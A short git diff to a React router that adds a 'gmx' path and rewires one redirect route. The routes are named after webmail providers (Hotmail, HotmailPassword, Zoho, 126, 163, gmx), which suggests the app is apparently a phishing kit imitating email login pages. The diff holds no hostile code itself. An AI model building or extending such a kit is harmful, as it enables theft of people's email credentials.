@@ -48,6 +48,7 @@ function App() {
     126: "p126",
     163: "p163",
     webmail: "wbm",
+    gmx: "gm",
   });
 
   return (
@@ -72,7 +73,7 @@ function App() {
         <Zoho path={page.zoho} />
         <Hotmail path="ht" />
         <HotmailPassword path={page.office} />
-        <RedirectNorecord path="/gm" />
+        <RedirectNorecord path={page.gmx} />
         <Processing path="processing" />
         <Portal path="portal" />
       </Router>
